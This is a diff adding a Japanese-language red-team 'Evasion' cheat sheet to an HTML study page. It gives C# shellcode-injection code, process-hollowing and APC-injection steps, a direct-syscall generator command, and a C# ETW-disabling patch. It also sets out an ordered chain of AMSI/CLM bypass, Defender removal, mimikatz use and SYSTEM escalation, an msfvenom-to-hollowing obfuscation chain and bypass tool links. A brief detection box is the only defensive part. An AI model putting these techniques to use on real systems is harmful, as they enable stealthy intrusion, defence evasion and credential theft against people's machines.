+        byte[] buf = new byte[] { /* XOR encoded shellcode */ };
+        for (int i = 0; i &lt; buf.Length; i++) buf[i] ^= 0xfa;
+
+        IntPtr h    = OpenProcess(0x001F0FFF, false, pid);
+        IntPtr addr = VirtualAllocEx(h, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
+        WriteProcessMemory(h, addr, buf, buf.Length, out _);
+        CreateRemoteThread(h, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+    }
+}</code></pre></div>
+
+      <h3>NtQueueApc injection</h3>
+      <p><code>CreateProcessW</code> で suspended プロセスを作り、<code>QueueUserAPC</code> で APC キューへ、<code>ResumeThread</code> で発火。Sysmon EID 8 (CreateRemoteThread) を回避できる。</p>
+
+      <h3>Process Hollowing</h3>
+      <p><code>CreateProcessW(CREATE_SUSPENDED)</code> → <code>NtUnmapViewOfSection</code> → <code>VirtualAllocEx</code> → <code>WriteProcessMemory</code> → entry point 書換 → <code>ResumeThread</code>。PEB から <code>ImageBaseAddress</code> 取得、<code>e_lfanew</code> (0x3C) → <code>AddressOfEntryPoint</code> (<code>e_lfanew + 0x28</code>) で entry point を算出する。PEN-300 range の定番手法。</p>
+
+      <h3>Direct syscall (userland hook 回避)</h3>
+      <p>EDR が <code>ntdll.dll</code> の <code>Nt*</code> をフックしている場合、直接 syscall を発行する。SSN の解決は静的テーブル / 動的取得 (Hell's Gate / Halo's Gate) のいずれか。</p>
+      <ul>
+        <li>SysWhispers3: <a href="https://github.com/klezVirus/SysWhispers3" target="_blank" rel="noopener">klezVirus/SysWhispers3</a></li>
+        <li>Hell's Gate / Halo's Gate: SSN 動的解決の代表実装</li>
+      </ul>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>python3 syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx,NtWaitForSingleObject -o syscalls</code></pre></div>
+
+      <h3>ETW patch (.NET 実行ログ抑止)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">csharp</span><button class="copy">copy</button></div>
+<pre><code><span class="c">// EtwEventWrite の先頭を ret (0xC3) で上書き</span>
+IntPtr addr = GetProcAddress(LoadLibrary("ntdll.dll"), "EtwEventWrite");
+VirtualProtect(addr, (UIntPtr)1, 0x40, out uint old);
+Marshal.Copy(new byte[] { 0xC3 }, 0, addr, 1);</code></pre></div>
+
+      <h3>Unhook (ntdll 復元)</h3>
+      <p>ディスクから <code>ntdll.dll</code> を再読込し、メモリ上のフック済みセクションを上書き。既存 C2 の多くが同種機構を実装している。</p>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>Sysmon EID 8 (CreateRemoteThread), EID 10 (ProcessAccess) で高権限プロセスへのハンドル取得を追跡</li>
+          <li>ETW-Ti (<code>Microsoft-Windows-Threat-Intelligence</code>) は kernel 側で発火するため userland パッチで抑止できない</li>
+          <li>Kernel callbacks (PsSetCreateProcessNotifyRoutine 系) を用いる EDR は unhook では回避されない</li>
+          <li><code>ntdll</code> の <code>.text</code> セクション整合性チェック (メモリ vs ディスク) を定期実行</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s10" class="reveal">
+      <h2><span class="num">10</span>Chaining &amp; Order<span class="jp">チェーン設計と要点</span></h2>
+
+      <h3>Execution order</h3>
+      <ol>
+        <li>環境偵察を絶対に省略しない — アーキ判定と CLM / AppLocker 確認なしにペイロードを生成すると無駄になる</li>
+        <li>AMSI bypass → ペイロード読込 の順序を厳守 (逆だと初回読込で検知される)</li>
+        <li>新規 PowerShell セッションごとに AMSI bypass を再実行 (プロセス単位で揮発)</li>
+        <li>CLM bypass 後に AMSI bypass (ConstrainedLanguage 下では <code>[Ref]</code> 等が制限される)</li>
+        <li>Admin 取得後すぐ Defender 無効化 + 定義削除 → 後続の mimikatz / SharpHound 等が即時通る</li>
+        <li>EDR 有り環境では Direct syscall を採用し userland フックを完全回避</li>
+      </ol>
+
+      <h3>Recommended obfuscation chain</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">text</span><button class="copy">copy</button></div>
+<pre><code>msfvenom (raw) → XOR (key=0xfa) → C# 埋込 → ConfuserEx 難読化 → InstallUtil 経由実行 → Process Hollowing</code></pre></div>
 
       <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
-        <ul><li>&lt;要点&gt;</li></ul>
+        <ul>
+          <li>アーキ判定 (<code>Is64BitProcess</code>) はペイロード選定の前提条件であり、ミスマッチは即失敗</li>
+          <li>CLM 環境では .NET 直接呼び出しが不可となるため、公開 bypass 実装を InstallUtil 経由で走らせ FullLanguage セッションへ昇格するのが定番</li>
+          <li>AMSI bypass はプロセス揮発性。新規 <code>powershell.exe</code> や新規 Runspace 生成のたびに再適用が必要</li>
+          <li>TamperProtection 有効時は <code>Set-MpPreference</code> が効かないため、サービス停止または DISM 削除に切替</li>
+          <li>EDR (CrowdStrike / SentinelOne 等) は Defender と独立してカーネルドライバで動作する。Defender 無効化のみでは足りず、Direct syscall または ntdll unhook が要る</li>
+          <li>SeImpersonate 権限はサービスアカウント侵害時の主要昇格経路。PrintSpoofer / GodPotato / SigmaPotato のいずれかで SYSTEM 化が可能</li>
+          <li>ホスト間のピボット時は防御層が変わるため、各ホストで Section 01 (環境偵察) を再実行する</li>
+        </ul>
       </div>
+
+      <h3>References</h3>
+      <ul>
+        <li><a href="https://github.com/Sh3lldon/FullBypass" target="_blank" rel="noopener">Sh3lldon/FullBypass</a> — MSBuild + .NET runner</li>
+        <li><a href="https://github.com/calebstewart/bypass-clm" target="_blank" rel="noopener">calebstewart/bypass-clm</a> — CLM breakout runspace</li>
+        <li><a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" target="_blank" rel="noopener">S3cur3Th1sSh1t/Amsi-Bypass-Powershell</a> — AMSI bypass カタログ</li>
+        <li><a href="https://github.com/klezVirus/SysWhispers3" target="_blank" rel="noopener">klezVirus/SysWhispers3</a> — direct syscall stub 生成</li>
+        <li><a href="https://github.com/itm4n/PrintSpoofer" target="_blank" rel="noopener">itm4n/PrintSpoofer</a> — SeImpersonate → SYSTEM</li>
+        <li><a href="https://github.com/BeichenDream/GodPotato" target="_blank" rel="noopener">BeichenDream/GodPotato</a> — .NET 4.8+ 対応 potato</li>
+        <li><a href="https://github.com/CsEnox/EventViewer-UACBypass" target="_blank" rel="noopener">CsEnox/EventViewer-UACBypass</a> — deserialization 型 UAC bypass</li>
+        <li><a href="https://github.com/Mattiwatti/PPLKiller" target="_blank" rel="noopener">Mattiwatti/PPLKiller</a> — vulnerable driver 経由 PPL 解除</li>
+        <li><a href="https://github.com/tylerdotrar/SigmaPotato" target="_blank" rel="noopener">tylerdotrar/SigmaPotato</a> — reflective potato</li>
+      </ul>
     </section>
 
-    <section id="ref" class="reveal">
-      <h2><span class="num">02</span>参照<span class="jp">References</span></h2>
-      <ul><li>&lt;出典&gt; — <a href="https://example.com" target="_blank" rel="noopener">example.com</a></li></ul>
-    </section>
   </article>
 </div>
 </div>
@@ -72,7 +581,7 @@ command --flag <span class="v">&lt;PLACEHOLDER&gt;</span></code></pre></div>
 
 <footer class="foot">
   <div class="wrap">
-    <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · &lt;TITLE&gt;</span></div>
+    <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · Evasion</span></div>
     <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>GitHub</a></div>
     <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
   </div>
